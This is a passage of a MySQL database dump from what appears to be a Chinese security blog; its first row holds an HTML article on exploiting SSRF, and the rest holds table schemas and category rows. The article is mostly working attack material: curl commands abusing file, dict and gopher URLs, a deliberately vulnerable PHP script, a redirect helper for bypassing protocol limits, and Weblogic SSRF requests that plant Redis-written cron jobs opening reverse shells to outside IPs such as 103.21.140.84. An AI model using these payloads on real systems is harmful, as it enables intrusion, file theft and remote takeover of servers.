font-size: 13px; white-space: normal;\">拿常用的cURL举例，cURL默认支持的协议非常多。</p><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">$&nbsp;curl&nbsp;-V\r\ncurl&nbsp;7.47.1&nbsp;(x86_64-apple-darwin15.3.0)&nbsp;libcurl/7.47.1&nbsp;OpenSSL/1.0.2g&nbsp;zlib/1.2.8&nbsp;&nbsp;\r\nProtocols:&nbsp;dict&nbsp;file&nbsp;ftp&nbsp;ftps&nbsp;gopher&nbsp;http&nbsp;https&nbsp;imap&nbsp;imaps&nbsp;pop3&nbsp;pop3s&nbsp;rtsp&nbsp;smb&nbsp;smbs&nbsp;smtp&nbsp;smtps&nbsp;telnet&nbsp;tftp&nbsp;&nbsp;\r\nFeatures:&nbsp;IPv6&nbsp;Largefile&nbsp;NTLM&nbsp;NTLM_WB&nbsp;SSL&nbsp;libz&nbsp;TLS-SRP&nbsp;UnixSockets</pre><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">本地利用姿势</h4><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">#&nbsp;dict&nbsp;protocol&nbsp;(操作Redis)\r\ncurl&nbsp;-vvv&nbsp;&#39;dict://127.0.0.1:6379/info&#39;\r\n\r\n#&nbsp;file&nbsp;protocol&nbsp;(任意文件读取)\r\ncurl&nbsp;-vvv&nbsp;&#39;file:///etc/passwd&#39;\r\n\r\n#&nbsp;gopher&nbsp;protocol&nbsp;(一键反弹Bash)\r\n#&nbsp;*&nbsp;注意:&nbsp;链接使用单引号，避免$变量问题\r\ncurl&nbsp;-vvv&nbsp;&#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/103.21.140.84/6789&nbsp;0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</pre><h3 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 18px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">远程利用</h3><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">漏洞代码ssrf.php（未做任何SSRF防御）</h4><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">function&nbsp;curl($url){&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init();\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_URL,&nbsp;$url);\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,&nbsp;0);\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_exec($ch);\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_close($ch);\r\n}\r\n\r\n$url&nbsp;=&nbsp;$_GET[&#39;url&#39;];\r\ncurl($url);</pre><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">远程利用方式</h4><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">#&nbsp;利用file协议任意文件读取\r\ncurl&nbsp;-v&nbsp;&#39;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&#39;\r\n\r\n#&nbsp;利用dict协议查看端口\r\ncurl&nbsp;-v&nbsp;&#39;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&#39;\r\n\r\n#&nbsp;利用gopher协议反弹shell\r\ncurl&nbsp;-v&nbsp;&#39;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</pre><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">漏洞代码ssrf2.php</h4><ul style=\"color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\" class=\" list-paddingleft-2\"><li><p>限制协议为HTTP、HTTPS</p></li><li><p>设置跳转重定向为True（默认不跳转）</p></li></ul><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">&lt;?php\r\nfunction&nbsp;curl($url){\r\n&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init();\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_URL,&nbsp;$url);\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_FOLLOWLOCATION,&nbsp;True);\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;限制为HTTPS、HTTP协议\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_PROTOCOLS,&nbsp;CURLPROTO_HTTP&nbsp;|&nbsp;CURLPROTO_HTTPS);\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,&nbsp;0);\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_exec($ch);\r\n&nbsp;&nbsp;&nbsp;&nbsp;curl_close($ch);\r\n}\r\n\r\n$url&nbsp;=&nbsp;$_GET[&#39;url&#39;];\r\ncurl($url);\r\n?&gt;</pre><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">远程利用方式</h4><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">我们继续构造一个302跳转服务，代码如下302.php:</p><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">&lt;?php&nbsp;&nbsp;\r\n$schema&nbsp;=&nbsp;$_GET[&#39;s&#39;];\r\n$ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;$_GET[&#39;i&#39;];\r\n$port&nbsp;&nbsp;&nbsp;=&nbsp;$_GET[&#39;p&#39;];\r\n$query&nbsp;&nbsp;=&nbsp;$_GET[&#39;q&#39;];\r\nif(empty($port)){&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Location:&nbsp;$schema://$ip/$query&quot;);&nbsp;\r\n}&nbsp;else&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Location:&nbsp;$schema://$ip:$port/$query&quot;);&nbsp;\r\n}</pre><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">利用测试</h4><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">#&nbsp;dict&nbsp;protocol&nbsp;-&nbsp;探测Redis\r\ndict://127.0.0.1:6379/info&nbsp;&nbsp;\r\ncurl&nbsp;-vvv&nbsp;&#39;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&#39;\r\n\r\n#&nbsp;file&nbsp;protocol&nbsp;-&nbsp;任意文件读取\r\ncurl&nbsp;-vvv&nbsp;&#39;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&#39;\r\n\r\n#&nbsp;gopher&nbsp;protocol&nbsp;-&nbsp;一键反弹Bash\r\n#&nbsp;*&nbsp;注意:&nbsp;gopher跳转的时候转义和`url`入参的方式有些区别\r\ncurl&nbsp;-vvv&nbsp;&#39;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0&nbsp;&nbsp;\r\na%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d&nbsp;&nbsp;\r\n%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3\r\n%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</pre><h2 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 24px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">Weblogic SSRF漏洞复现</h2><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><h3 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 18px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">漏洞分析</h3><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">SSRF漏洞存在于<a href=\"http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84operator%E5%8F%82%E6%95%B0%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E5%8F%AF%E4%BB%A5%E5%8F%91%E9%80%81%E4%BB%BB%E6%84%8F%E7%9A%84HTTP%E8%AF%B7%E6%B1%82\" style=\"color: rgb(0, 105, 214);\">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求</a></p><h3 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 18px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">利用姿势</h3><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">探查服务端口</h4><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href=\"http://127.0.0.1:7001/\" style=\"color: rgb(0, 105, 214);\">http://127.0.0.1:7001</a></p><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">POST&nbsp;/uddiexplorer/SearchPublicRegistries.jsp&nbsp;HTTP/1.1\r\nHost:&nbsp;http://127.0.0.1:7001\r\nContent-Length:&nbsp;133\r\nCache-Control:&nbsp;max-age=0\r\nOrigin:&nbsp;http://127.0.0.1:7001\r\nUpgrade-Insecure-Requests:&nbsp;1\r\nUser-Agent:&nbsp;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;6.1;&nbsp;Win64;&nbsp;x64)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/57.0.2987.133&nbsp;Safari/537.36\r\nContent-Type:&nbsp;application/x-www-form-urlencoded\r\nAccept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nReferer:&nbsp;http://115.159.4.50:7001/uddiexplorer/SearchPublicRegistries.jsp\r\nAccept-Language:&nbsp;zh-CN,zh;q=0.8\r\nCookie:&nbsp;publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM&nbsp;V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|;&nbsp;JSESSIONID=CZBhZtjHKR2mvqmnyBbVchhHvJ1KJ48lq4rq84pZnpFL2hkXrnhc!1235713544\r\nConnection:&nbsp;close\r\n\r\noperator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=1&amp;txtSearchkey=1&amp;txtSearchfor=1&amp;selfor=Business+location&amp;btnSubmit=Search</pre><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">返回以下信息，说明存在7001端口的服务器&nbsp;<img src=\"/ueditor/php/upload/image/20171104/1509769197461989.png\" alt=\"\"/></p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">访问一个不存在的IP，返回以下信息，返回 but could not connect over HTTP to server&nbsp;<img src=\"/ueditor/php/upload/image/20171104/1509769197461903.png\" alt=\"\"/></p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">访问一个非HTTP（dict）协议，返回以下信息，返回unknown protocol: dict&nbsp;<img src=\"/ueditor/php/upload/image/20171104/1509769197129009.png\" alt=\"\"/></p><h4 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">注入HTTP头，利用Redis反弹shell</h4><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通 返回 which did not have a valid SOAP content-type: null 说明存在redis服务</p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\"><img src=\"/ueditor/php/upload/image/20171104/1509769198131066.png\" alt=\"\"/></p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">发送三条redis命令，将弹shell脚本写入/etc/crontab：</p><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">set&nbsp;1&nbsp;&quot;\\n\\n\\n\\n*&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/172.18.0.1/21&nbsp;0&gt;&amp;1\\n\\n\\n\\n&quot;\r\nconfig&nbsp;set&nbsp;dir&nbsp;/etc/\r\nconfig&nbsp;set&nbsp;dbfilename&nbsp;crontab\r\nsave</pre><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">进行url编码：</p><pre style=\"font-family: Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, monospace; padding: 14px; margin-top: 0px; margin-bottom: 18px; line-height: 16px; font-size: 11px; border: 1px solid rgb(217, 217, 217); white-space: pre-wrap; word-wrap: break-word; color: rgb(115, 115, 115);\">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</pre><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\"><img src=\"/ueditor/php/upload/image/20171104/1509769198782489.png\" alt=\"\"/></p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">反弹shell</p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\"><img src=\"/ueditor/php/upload/image/20171104/1509769198966493.png\" alt=\"\"/></p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">最后补充一下，可进行利用的cron有如下几个地方：</p><ul style=\"color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\" class=\" list-paddingleft-2\"><li><p>/etc/crontab 这个是肯定的</p></li><li><p>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</p></li><li><p>/var/spool/cron/root centos系统下root用户的cron文件</p></li><li><p>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</p></li></ul><h2 style=\"margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 24px; font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; white-space: normal;\">Reference</h2><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\"><a href=\"http://joychou.org/index.php/web/phpssrf.html\" style=\"color: rgb(0, 105, 214);\">SSRF in PHP</a>&nbsp;<a href=\"http://blog.feei.cn/ssrf/\" style=\"color: rgb(0, 105, 214);\">SSRF to GET SHELL</a></p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\">&nbsp;<a href=\"https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2\" style=\"color: rgb(0, 105, 214);\">利用 gopher 协议拓展攻击面</a>&nbsp;</p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\"><a href=\"https://github.com/phith0n/vulhub/tree/master/weblogic/ssrf\" style=\"color: rgb(0, 105, 214);\">vulhub/weblogic/ssrf</a>&nbsp;</p><p style=\"margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Hiragino Sans GB&quot;, Arial, sans-serif; font-size: 13px; white-space: normal;\"><a href=\"https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html\" style=\"color: rgb(0, 105, 214);\">腾讯某处SSRF漏洞(非常好的利用点)附利用脚本</a></p><p><br/></p>','/uploads/20171104\\aa1abb502762905b04e6cbcff799bb09.png',3,1,1509769089,5);

#
# Structure for table "tp_cate"
#

CREATE TABLE `tp_cate` (
  `id` mediumint(9) NOT NULL AUTO_INCREMENT,
  `catename` varchar(30) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

#
# Data for table "tp_cate"
#

INSERT INTO `tp_cate` VALUES (2,'编程语言'),(3,'工控安全'),(4,'逆向分析'),(5,'Web安全');

#
# Structure for table "tp_links"
#

CREATE TABLE `tp_links` (
  `id` mediumint(9) NOT NULL AUTO_INCREMENT,
  `title` varchar(30) DEFAULT NULL,
  `url` varchar(60) DEFAULT NULL,
  `desc` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

#
# Data for table "tp_links"
#

INSERT INTO `tp_links` VALUES (1,'百度','http://www.baidu.com','百度网1');

#
# Structure for table "tp_tags"
#

CREATE TABLE `tp_tags` (
  `id` mediumint(9) NOT NULL AUTO_INCREMENT,
  `tagname` varchar(30) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Data for table "tp_tags"
#

